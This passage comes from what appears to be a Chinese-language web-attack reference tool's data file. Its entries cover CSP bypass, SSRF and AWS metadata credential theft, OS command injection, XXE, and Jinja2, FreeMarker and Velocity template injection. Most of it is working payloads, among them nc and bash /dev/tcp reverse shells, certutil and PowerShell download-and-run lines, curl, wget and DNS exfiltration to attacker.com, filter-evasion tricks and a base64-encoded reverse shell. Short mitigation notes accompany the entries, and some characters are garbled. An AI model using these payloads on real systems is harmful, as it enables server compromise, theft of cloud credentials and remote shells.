              { part: 'setTimeout("alert(1)", 0)', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n可以使用eval等函数', explanation: '注入代码', type: 'value' }
            ],
        description: '利用unsafe-eval配置',
        platform: 'all',
      },
      {
        title: '4. JSONP绕过',
        command: `如果允许的域名有JSONP端点:
<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>
利用JSONP回调执行代码`,
        description: '利用JSONP绕过',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'callback', explanation: 'JSONP回调参数', type: 'value' },
        ]
      },
      {
        title: '5. AngularJS绕过',
        command: `如果允许了AngularJS CDN:
<div ng-app ng-csp>
<div ng-focus="$event.path|orderBy:'[].constructor.from([alert(1)])'" tabindex=0>
</div>
</div>`,
        description: '利用AngularJS绕过CSP',
        platform: 'all',
      },
      {
        title: '6. Dangling Markup',
        command: `<img src='http://attacker.com/?
捕获后续HTML内容�到遇到单引号`,
        description: '利用悬挂标记窃取数据',
        platform: 'all',
      },
    ],
    wafBypass: [
      {
        title: 'JSONP端点劫持CSP',
        command: `# 寻找白名单域上的JSONP端点:
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>`,
            syntaxBreakdown: [
              { part: '# 寻找白名单域上的JSONP端点:\n', explanation: '注入代码', type: 'value' },
              { part: '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js">', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<div ng-app ng-csp>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '{{$eval.constructor("alert(1)")()}}', explanation: '注入代码', type: 'value' },
              { part: '</div>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
        description: '利用CSP白名单域上的JSONP回调端点或AngularJS库执行任意JavaScript，无需unsafe-inline',
      },
      {
        title: 'base-uri劫持与script nonce泄露',
        command: `# base-uri未限制时:
<base href="http://attacker.com/">
# 页面中相对路径的脚本将从attacker.com加载

# nonce泄露利用:
# 通过CSS注入窃取nonce:
<style>script[nonce^="a"]{background:url(http://attacker.com/?n=a)}</style>
# 或通过DOM读取: document.querySelector("script[nonce]").nonce`,
            syntaxBreakdown: [
              { part: '# base-uri未限制时:\n', explanation: '注入代码', type: 'value' },
              { part: '<base href="http://attacker.com/">', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n# 页面中相对路径的脚本将从attacker.com加载\n\n# nonce泄露利用:\n# 通过CSS注入窃取nonce:\n', explanation: '注入代码', type: 'value' },
              { part: '<style>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'script[nonce^="a"]{background:url(http://attacker.com/?n=a)}', explanation: '注入代码', type: 'value' },
              { part: '</style>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n# 或通过DOM读取: document.querySelector("script[nonce]").nonce', explanation: '注入代码', type: 'value' }
            ],
        description: '利用CSP未限制base-uri指令劫持脚本加载源，或通过CSS注入/DOM接口泄露script nonce值',
      },
    ],
    tutorial: {
      overview: 'CSP(Content Security Policy)是浏览器端的XSS防御机制，通过限制脚本来源阻止恶意代码执行。CSP绕过技术利用策略配置缺陷或可信域名上的gadget来突破限制。',
      vulnerability: 'CSP绕过的常见攻击面：unsafe-inline/unsafe-eval策略过于宽松、base-uri未限制导致<base>标签劫持、script-src白名单包含CDN/JSONP端点、object-src未限制允许Flash/PDF XSS、缺少default-src兜底策略。',
      exploitation: '完�利用流程：\n1. 分析CSP策略\n2. 寻找白名单中的可利用域名\n3. 构造绕过payload\n4. 执行恶意脚本',
      mitigation: '防御措施：\n1. 使用严格的CSP策略\n2. 避免unsafe-inline和unsafe-eval\n3. 仔细审查白名单域名\n4. 使用nonce或hash方式',
      difficulty: 'advanced'
    }
  },
  {
    id: 'ssrf-basic',
    name: '基础SSRF攻击',
    description: '服务端请求伪造基础攻击技术',
    category: 'SSRF服务端请求伪造',
    subCategory: '基础攻击',
    tags: ['ssrf', 'server-side', 'request'],
    prerequisites: ['存在URL输入点', '服务器会请求用户提供的URL'],
    execution: [
      { 
        title: '1. 探测SSRF', 
        command: '输入URL: http://127.0.0.1\n输入URL: http://localhost\n输入URL: http://[::1]\n观察服务器响应是否包含内网信息', 
        description: '探测SSRF漏�', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '127.0.0.1', explanation: '本地回环地址' },
          { part: 'localhost', explanation: '本地主机名' },
          { part: '[::1]', explanation: 'IPv6本地地址' }
        ]
      },
      { 
        title: '2. 扫描内网端口', 
        command: 'http://192.168.1.1:22\nhttp://192.168.1.1:80\nhttp://192.168.1.1:443\nhttp://192.168.1.1:3306\n根据响应差异判断端口开放状态',
            syntaxBreakdown: [
              { part: 'http://192.168.1.1:22\nhttp://192.168.1.1:80\nhttp://192.168.1.1:443\nhttp://192', explanation: '攻击载荷', type: 'value' }
            ],
        description: '扫描内网端口', 
        platform: 'all'
      },
      { 
        title: '3. 访问内网服务', 
        command: 'http://192.168.1.100/admin\nhttp://10.0.0.1:8080/manager\nhttp://172.16.0.1:9200/_cat/indices\n访问内网管理界面或敏感服务',
            syntaxBreakdown: [
              { part: 'http://192.168.1.100/admin\nhttp://10.0.0.1:8080/manager\nhttp://172.16.0.1:9200', explanation: '攻击载荷', type: 'value' }
            ],
        description: '访问内网服务', 
        platform: 'all'
      },
      { 
        title: '4. 读取本地文件', 
        command: 'file:///etc/passwd\nfile:///c:/windows/win.ini\nfile:///proc/self/environ\n使用file协议读取本地文件', 
        description: '读取本地文件', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'file://', explanation: '本地文件协议' },
          { part: '/etc/passwd', explanation: 'Linux用户信息文件' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: 'IP格式绕过', 
        command: 'http://0177.0.0.1 (八进制)\nhttp://2130706433 (十进制)\nhttp://0x7f000001 (十六进制)\nhttp://127.1 (简写)\nhttp://127.0.0.1.nip.io (DNS重绑定)', 
        description: '使用不同IP格式绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '0177', explanation: '127的八进制表示' },
          { part: '2130706433', explanation: '127.0.0.1的十进制表示' }
        ]
      },
      { 
        title: 'URL解析差异', 
        command: 'http://attacker.com#@127.0.0.1/\nhttp://127.0.0.1.attacker.com\nhttp://attacker.com\\@127.0.0.1/\n利用URL解析差异绕过',
            syntaxBreakdown: [
              { part: 'http://attacker.com#@127.0.0.1/\nhttp://127.0.0.1.attacker.com\nhttp://attacker.', explanation: '攻击载荷', type: 'value' }
            ],
        description: '利用URL解析差异', 
        platform: 'all'
      },
      { 
        title: 'DNS重绑定', 
        command: '使用DNS重绑定服务:\nhttp://7f000001.cip.cc (解析为127.0.0.1)\nhttp://127.0.0.1.nip.io\n第一次解析为外网IP，第二次解析为内网IP',
            syntaxBreakdown: [
              { part: '使用DNS重绑定服务:\nhttp://7f000001.cip.cc', explanation: '命令/载荷起始', type: 'command' },
              { part: ' (解析为127.0.0.1)\nhttp://127.0.0.1.nip.io\n第一次解析为外网IP，第二次解析为内网IP', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: 'DNS重绑定攻击', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'SSRF(Server-Side Request Forgery)服务端请求伪造允许攻击者通过目标服务器发起任意网络请求，可用于访问内网资源、云元数据、本地服务等外部无法直接到达的目标。',
      vulnerability: 'SSRF漏洞存在于服务器根据用户提供的URL发起请求的场景：图片加载/预览、URL导入、Webhook回调、PDF生成器、文件下载代理等。攻击者可操纵URL指向内网地址(127.0.0.1/10.x/172.16.x)或云元数据端点。',
      exploitation: '完�利用流程：\n1. 探测SSRF漏�存在\n2. 扫描内网端口和服务\n3. 访问内部管理界面\n4. 读取敏感文件或攻击内网服务',
      mitigation: '防御措施：\n1. 白名单验证URL\n2. 禁用不必要的协议\n3. 验证解析后的IP地址\n4. 网络隔离和访问控制',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssrf-cloud-aws',
    name: 'AWS元数据攻击',
    description: '利用SSRF访问AWS EC2元数据服务',
    category: 'SSRF服务端请求伪造',
    subCategory: '云元数据',
    tags: ['ssrf', 'aws', 'metadata', 'cloud'],
    prerequisites: ['存在SSRF漏�', '目标运行在AWS EC2上'],
    execution: [
      {
        title: '1. 访问元数据服务',
        command: `http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/`,
        description: '访问AWS元数据服务',
        platform: 'all',
        syntaxBreakdown: [
          { part: '169.254.169.254', explanation: 'AWS元数据服务地址', type: 'value' },
          { part: 'latest', explanation: '最新版本的API', type: 'value' },
          { part: 'meta-data', explanation: '实例元数据', type: 'value' },
        ]
      },
      {
        title: '2. 获取IAM凭证',
        command: `http://169.254.169.254/latest/meta-data/iam/security-credentials/
获取角色名后:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`,
        description: '获取IAM�时凭证',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'iam/security-credentials', explanation: 'IAM安全凭证路径', type: 'value' },
        ]
      },
      {
        title: '3. 获取用户数据',
        command: `http://169.254.169.254/latest/user-data/
可能包含敏感信息、API密钥、启动脚本`,
            syntaxBreakdown: [
              { part: 'http://169.254.169.254/latest/user-data/', explanation: '第1步操作', type: 'command' },
              { part: '可能包含敏感信息、API密钥、启动脚本', explanation: '第2步操作', type: 'value' }
            ],
        description: '获取实例用户数据',
        platform: 'all',
      },
      {
        title: '4. 使用IMDSv2绕过',
        command: `如果IMDSv2被强制:
1. 先获取token:
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
2. 使用token访问:
Header: X-aws-ec2-metadata-token: TOKEN`,
        description: '绕过IMDSv2保护',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'X-aws-ec2-metadata-token', explanation: 'IMDSv2认证token', type: 'value' },
        ]
      },
    ],
    wafBypass: [
      {
        title: 'IP编码变体绕过',
        command: `# 十进制整数:
http://2852039166/latest/meta-data/
# 十六进制:
http://0xA9FEA9FE/latest/meta-data/
# 八进制:
http://0251.0376.0251.0376/latest/meta-data/
# IPv6映射:
http://[::ffff:169.254.169.254]/latest/meta-data/
# 混合编码:
http://0xA9.0376.169.0xFE/latest/meta-data/`,
            syntaxBreakdown: [
              { part: '# 十进制整数:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共10行', type: 'value' }
            ],
        description: '通过十进制、十六进制、八进制及IPv6映射等IP地址编码方式绕过169.254.169.254黑名单检测',
      },
      {
        title: 'DNS重绑定与重定向链绕过',
        command: `# DNS重绑定(使用rebind服务):
http://7f000001.A9FEA9FE.rbndr.us/latest/meta-data/
# 第一次解析到允许的IP，第二次解析到169.254.169.254

# 重定向链:
# 在attacker.com设置302跳转到http://169.254.169.254
http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/

# URL schema变体:
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.254.169.254%0A%0A`,
            syntaxBreakdown: [
              { part: '# DNS重绑定(使用rebind服务):', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共8行', type: 'value' }
            ],
        description: '利用DNS重绑定使域名在验证时解析为安全IP而实际请求时解析为元数据地址，或通过HTTP重定向链和非标准协议绕过',
      },
    ],
    tutorial: {
      overview: 'AWS环境中的SSRF攻击可通过元数据服务(169.254.169.254)获取IAM临时凭证、实例配置等敏感信息，是云环境中最高危的SSRF利用场景之一，曾导致Capital One等重大数据泄露事件。',
      vulnerability: 'AWS EC2实例的元数据服务默认在169.254.169.254上开放(IMDSv1无需特殊认证)，通过SSRF可获取IAM角色的临时AccessKey/SecretKey/Token，进而访问S3存储桶、RDS数据库、Lambda函数等AWS服务上的敏感数据。',
      exploitation: '完�利用流程：\n1. 通过SSRF访问元数据服务\n2. 获取IAM角色凭证\n3. 使用凭证访问AWS资源\n4. 获取用户数据中的敏感信息',
      mitigation: '防御措施：\n1. 使用IMDSv2并强制token认证\n2. 限制IAM角色权限\n3. 不要在用户数据中存储敏感信息\n4. 使用SSRF防护',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'rce-command-injection',
    name: '命令注入',
    description: '操作系统命令注入攻击技术',
    category: 'RCE远程代码执行',
    subCategory: '命令注入',
    tags: ['rce', 'command', 'injection', 'os'],
    prerequisites: ['存在系统命令执行功能', '用户输入未过滤'],
    execution: [
      { 
        title: '1. 探测命令注入', 
        command: '; id\n| id\n`id`\n$(id)\n&& id\n|| id\ntest;id\ntest|id', 
        description: '探测命令注入点', 
        platform: 'all',
        syntaxBreakdown: [
          { part: ';', explanation: 'Linux命令分隔符' },
          { part: '|', explanation: '管道符，传递输出' },
          { part: '`', explanation: '反引号命令替换' },
          { part: '$()', explanation: '命令替换语法' },
          { part: '&&', explanation: '前命令成功后执行' },
          { part: '||', explanation: '前命令失�后执行' }
        ]
      },
      { 
        title: '2. Linux命令注入', 
        command: '; whoami\n; id\n; cat /etc/passwd\n; ls -la /\n; nc -e /bin/bash attacker.com 4444\n; bash -i >& /dev/tcp/attacker/4444 0>&1', 
        description: 'Linux系统命令注入', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'whoami', explanation: '显示当前用户' },
          { part: 'nc -e', explanation: 'Netcat反弹Shell' },
          { part: '/dev/tcp', explanation: 'Bash网络重定向' }
        ]
      },
      { 
        title: '3. Windows命令注入', 
        command: '& whoami\n& dir\n& type C:\\windows\\win.ini\n& certutil -urlcache -split -f http://attacker/shell.exe shell.exe & shell.exe\n& powershell -c "IEX(New-Object Net.WebClient).downloadString(\'http://attacker/shell.ps1\')"', 
        description: 'Windows系统命令注入', 
        platform: 'windows',
        syntaxBreakdown: [
          { part: '&', explanation: 'Windows命令分隔符' },
          { part: 'certutil', explanation: 'Windows下载工具' },
          { part: 'powershell -c', explanation: '执行PowerShell命令' }
        ]
      },
      { 
        title: '4. 盲命令注入', 
        command: '; sleep 5\n; ping -c 5 attacker.com\n& timeout 5\n通过响应时�差异判断命令是否执行', 
        description: '盲命令注入探测', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'sleep', explanation: 'Linux延时命令' },
          { part: 'timeout', explanation: 'Windows延时命令' }
        ]
      },
      { 
        title: '5. 外带数据', 
        command: '; curl http://attacker.com/?data=$(whoami)\n; wget http://attacker.com/?data=$(id|base64)\n; nslookup $(whoami).attacker.com\n; ping $(whoami | xxd -p).attacker.com', 
        description: '通过外带通道获取数据', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'curl', explanation: 'HTTP请求工具' },
          { part: 'nslookup', explanation: 'DNS查询工具' },
          { part: 'xxd -p', explanation: '转换为十六进制' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '空格绕过', 
        command: ';{cat,/etc/passwd}\n;cat$IFS/etc/passwd\n;cat</etc/passwd\n;cat%09/etc/passwd\n;cat${IFS}/etc/passwd', 
        description: '绕过空格过滤', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '$IFS', explanation: '内部字段分隔符变量' },
          { part: '%09', explanation: 'Tab字符URL编码' },
          { part: '{}', explanation: '大括号扩展' }
        ]
      },
      { 
        title: '关键字绕过', 
        command: '; c\'\'at /etc/passwd\n; c""at /etc/passwd\n; c\\at /etc/passwd\n; /bin/c?a?t /etc/passwd\n; /bin/ca[t] /etc/passwd', 
        description: '绕过关键字过滤', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '; c\\'\\'at /etc/passwd\n; c""at', explanation: '绕过技术', type: 'technique' },
          { part: 'c\\'\\'at', explanation: '关键参数', type: 'value' },
          { part: '/etc/passwd\n;', explanation: '关键参数', type: 'value' },
          { part: 'c""at', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '编码绕过', 
        command: '; echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash\n; $(printf "\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64")', 
        description: '使用编码绕过', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'base64 -d', explanation: 'Base64解码' },
          { part: 'printf "\\x"', explanation: '十六进制编码' }
        ]
      }
    ],
    tutorial: {
      overview: 'OS命令注入允许攻击者通过Web应用在服务器操作系统上执行任意系统命令。漏洞通常出现在应用调用系统命令处理用户输入的场景(如文件操作、网络诊断、数据处理等)。',
      vulnerability: '命令注入的根因是应用将用户输入直接拼接到system()/exec()/popen()等系统命令执行函数中。攻击者通过管道符(|)、分号(;)、反引号(`)、$()等shell元字符链接恶意命令，突破原始命令的预期行为。',
      exploitation: '完�利用流程：\n1. 探测命令注入点\n2. 确定操作系统类型\n3. 绕过过滤机制\n4. 执行恶意命令\n5. 获取Shell或窃取数据',
      mitigation: '防御措施：\n1. 避免使用系统命令执行函数\n2. 使用参数化API调用\n3. 严格的输入验证和白名单\n4. 使用最小权限运行\n5. 禁用危险函数',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'xxe-basic',
    name: 'XXE基础攻击',
    description: 'XML外部实体注入基础攻击技术',
    category: 'XXE实体注入',
    subCategory: '基础攻击',
    tags: ['xxe', 'xml', 'external', 'entity'],
    prerequisites: ['存在XML解析功能', '外部实体未被禁用'],
    execution: [
      { 
        title: '1. 探测XXE', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>', 
        description: '基础XXE测试', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'DOCTYPE', explanation: '文档类型声明' },
          { part: 'ENTITY', explanation: '定义实体' },
          { part: 'SYSTEM', explanation: '引用外部资源' },
          { part: '&xxe;', explanation: '引用实体' }
        ]
      },
      { 
        title: '2. 读取文件', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">\n]>\n<root>&xxe;</root>',
        description: '读取Windows文件', 
        platform: 'windows',
        syntaxBreakdown: [
          { part: '<!DOCTYPE>', explanation: '文档类型声明', type: 'tag' },
          { part: '<!ENTITY>', explanation: '实体定义', type: 'tag' },
          { part: 'SYSTEM', explanation: '外部实体引用', type: 'keyword' },
          { part: 'file://', explanation: '本地文件协议', type: 'technique' }
        ]
      },
      { 
        title: '3. 读取PHP源码', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">\n]>\n<root>&xxe;</root>', 
        description: '使用PHP Filter读取源码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'php://filter', explanation: 'PHP伪协议' },
          { part: 'convert.base64-encode', explanation: 'Base64编码' }
        ]
      },
      { 
        title: '4. SSRF攻击', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">\n]>\n<root>&xxe;</root>',
        description: '利用XXE进行SSRF', 
        syntaxBreakdown: [
          { part: '<!DOCTYPE>', explanation: '文档类型声明', type: 'tag' },
          { part: '<!ENTITY>', explanation: '实体定义', type: 'tag' },
          { part: 'SYSTEM', explanation: '外部实体引用', type: 'keyword' },
          { part: 'http://', explanation: 'HTTP协议', type: 'technique' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '参数实体', 
        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">\n  %xxe;\n]>\n<root>test</root>', 
        description: '使用参数实体绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '%', explanation: '参数实体引用符' },
          { part: '%xxe;', explanation: '引用参数实体' }
        ]
      },
      { 
        title: '编码绕过', 
        command: '<?xml version="1.0" encoding="UTF-16"?>\n使用不同编码绕过WAF',
        description: '使用编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'XXE(XML External Entity)注入利用XML解析器处理外部实体引用的特性，通过定义恶意实体引用来读取服务器文件、发起SSRF请求、甚至在特定环境下执行远程代码。',
      vulnerability: 'XXE漏洞源于XML解析器默认启用外部实体处理。攻击者在XML输入中声明SYSTEM或PUBLIC实体指向本地文件(file://)或网络资源(http://)，解析器会自动获取并替换实体内容，导致文件读取和SSRF等危害。',
      exploitation: '完�利用流程：\n1. 找到XML输入点\n2. 注入外部实体声明\n3. 读取敏感文件\n4. 或发起SSRF攻击',
      mitigation: '防御措施：\n1. 禁用外部实体处理\n2. 禁用DTD处理\n3. 使用安全的XML解析配置\n4. 输入验证',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssti-jinja2',
    name: 'Jinja2模板注入',
    description: 'Jinja2/Twig模板注入攻击技术',
    category: 'SSTI模板注入',
    subCategory: 'Jinja2',
    tags: ['ssti', 'jinja2', 'twig', 'template'],
    prerequisites: ['使用Jinja2/Twig模板引擎', '用户输入�接渲染到模板'],
    execution: [
      { 
        title: '1. 探测SSTI', 
        command: '{{7*7}}\n${7*7}\n<%= 7*7 %>\n{{config}}\n如果输出49或配置信息，则存在SSTI', 
        description: '探测模板注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '{{', explanation: 'Jinja2变量输出语法' },
          { part: '7*7', explanation: '数学表达式' },
          { part: '}}', explanation: '变量输出结束' }
        ]
      },
      { 
        title: '2. 信息收集', 
        command: '{{config}}\n{{self}}\n{{request}}\n{{"".__class__.__mro__}}\n{{"".__class__.__mro__[1].__subclasses__()}}', 
        description: '收集环境信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '__class__', explanation: '获取对象的类' },
          { part: '__mro__', explanation: '方法解析顺序' },
          { part: '__subclasses__', explanation: '获取子类列表' }
        ]
      },
      { 
        title: '3. 命令执行', 
        command: "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", 
        description: '执行系统命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '__init__', explanation: '类的初始化方法' },
          { part: '__globals__', explanation: '全局命名空�' },
          { part: 'popen', explanation: '打开管道执行命令' }
        ]
      },
      { 
        title: '4. 反弹Shell', 
        command: "{{config.__class__.__init__.__globals__['os'].popen('bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"').read()}}", 
        description: '获取反弹Shell', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: '__class__', explanation: 'Python类属性', type: 'keyword' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '字符串拼接', 
        command: "{{''['__cla'+'ss__']}}\n{{''|attr('__cla'+'ss__')}}\n{{''|attr('\\x5f\\x5fcla\\x5f\\x5fss')}}", 
        description: '使用字符串拼接绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'attr()', explanation: 'Jinja2过滤器获取属性' },
          { part: '\\x5f', explanation: '下划线的十六进制编码' }
        ]
      },
      { 
        title: '使用request对象', 
        command: "{{request|attr(request.args.a)}}&a=__class__\n{{request|attr(request.args.a)|attr(request.args.b)}}&a=__class__&b=__mro__", 
        description: '通过request参数传递', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: '__class__', explanation: 'Python类属性', type: 'keyword' },
          { part: '__mro__', explanation: '方法解析顺序', type: 'keyword' }
        ]
      }
    ],
    tutorial: {
      overview: 'Jinja2是Python最流行的模板引擎，SSTI漏洞允许攻击者在模板中注入恶意表达式，通过Python的MRO(方法解析顺序)链访问内置类实现远程代码执行，危害极为严重。',
      vulnerability: 'Jinja2 SSTI漏洞发生在用户输入被直接嵌入模板字符串(如Template(user_input).render())而非通过安全的变量传递时。攻击者通过{{}}表达式访问Python对象树，利用__mro__/__subclasses__()找到os/subprocess等模块执行系统命令。',
      exploitation: '完�利用流程：\n1. 探测模板注入点\n2. 识别模板引擎类型\n3. 探�类继承链\n4. 找到可利用的类\n5. 执行系统命令',
      mitigation: '防御措施：\n1. 不要将用户输入�接渲染到模板\n2. 使用沙箱环境\n3. 限制模板功能\n4. 输入验证和过滤',
      difficulty: 'advanced'
    }
  },
  {
    id: 'ssti-freemarker',
    name: 'FreeMarker模板注入',
    description: 'FreeMarker模板引擎注入攻击技术',
    category: 'SSTI模板注入',
    subCategory: 'FreeMarker',
    tags: ['ssti', 'freemarker', 'java', 'template'],
    prerequisites: ['使用FreeMarker模板引擎', '用户输入�接渲染到模板'],
    execution: [
      { 
        title: '1. 探测SSTI', 
        command: '${7*7}\n${"freemarker"}\n<#assign ex="freemarker">\n如果输出49或freemarker，则存在SSTI', 
        description: '探测FreeMarker模板注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '${', explanation: 'FreeMarker变量输出语法' },
          { part: '7*7', explanation: '数学表达式' },
          { part: '}', explanation: '变量输出结束' }
        ]
      },
      { 
        title: '2. 信息收集', 
        command: '${.version}\n${.current_template_name}\n${.lang}\n${system_property["java.version"]}\n${system_property["os.name"]}', 
        description: '收集环境信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '.version', explanation: 'FreeMarker版本' },
          { part: 'system_property', explanation: 'Java系统属性' }
        ]
      },
      { 
        title: '3. 命令执行 - new', 
        command: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}\n<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}', 
        description: '使用Execute类执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '?new()', explanation: '实例化类' },
          { part: 'Execute', explanation: 'FreeMarker内置命令执行类' }
        ]
      },
      { 
        title: '4. 命令执行 - api', 
        command: '<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.Runtime","getRuntime").exec("id")}\n<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.ProcessBuilder","/bin/sh","-c","id").start()}', 
        description: '使用ObjectConstructor执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'ObjectConstructor', explanation: '反射构造对象' },
          { part: 'java.lang.Runtime', explanation: 'Java Runtime类' }
        ]
      },
      { 
        title: '5. 反弹Shell', 
        command: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}',
            syntaxBreakdown: [
              { part: '<#assign', explanation: '命令/载荷起始', type: 'command' },
              { part: ' ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '获取反弹Shell', 
        platform: 'linux'
      }
    ],
    wafBypass: [
      { 
        title: '字符串拼接', 
        command: '<#assign ex="freemarker.template.utility.Ex"+"ecute"?new()>${ex("id")}\n<#assign cls="java.lang.Ru"+"ntime">${cls?new().exec("id")}', 
        description: '使用字符串拼接绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Ex"+"ecute', explanation: '字符串拼接绕过关键字检测' }
        ]
      },
      { 
        title: '使用内置函数', 
        command: '${"freemarker.template.utility.Execute"?new()("id")}\n${"java.lang.Runtime"?new().exec("id")}',
        description: '�接实例化执行', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: 'Runtime', explanation: '运行时执行', type: 'keyword' }
        ]
      }
    ],
    tutorial: {
      overview: 'FreeMarker是Java生态中广泛使用的模板引擎，其SSTI漏洞可通过内置的freemarker.template.utility.Execute类或ObjectConstructor直接执行Java代码和系统命令。',
      vulnerability: 'FreeMarker SSTI利用其强大的内置功能：通过<#assign>指令实例化Java类，调用freemarker.template.utility.Execute执行命令，或使用ObjectConstructor/JythonRuntime等内置对象。配置不当时new()内建函数可创建任意Java对象。',
      exploitation: '完�利用流程：\n1. 探测模板注入点\n2. 确认FreeMarker引擎\n3. 使用Execute类执行命令\n4. 或使用ObjectConstructor反射调用',
      mitigation: '防御措施：\n1. 不要将用户输入�接渲染到模板\n2. 配置sandbox\n3. 禁用new内置函数\n4. 使用安全的模板配置',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssti-velocity',
    name: 'Velocity模板注入',
    description: 'Velocity模板引擎注入攻击技术',
    category: 'SSTI模板注入',
    subCategory: 'Velocity',
    tags: ['ssti', 'velocity', 'java', 'template'],
    prerequisites: ['使用Velocity模板引擎', '用户输入�接渲染到模板'],
    execution: [
      { 
        title: '1. 探测SSTI', 
        command: '#set($x=7*7)$x\n$velocityVersion\n$class.inspect("java.lang.Runtime")\n如果输出49或版本信息，则存在SSTI', 
        description: '探测Velocity模板注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#set', explanation: 'Velocity变量赋值指令' },
          { part: '$x', explanation: '变量引用' },
          { part: '$velocityVersion', explanation: 'Velocity版本信息' }
        ]
      },
      { 
        title: '2. 信息收集', 
        command: '$class.inspect("java.lang.System")\n$class.inspect("java.lang.Runtime")\n$sys.class.forName("java.lang.Runtime")', 
        description: '收集环境信息', 
        platform: 'all',
        syntaxBreakdown: [
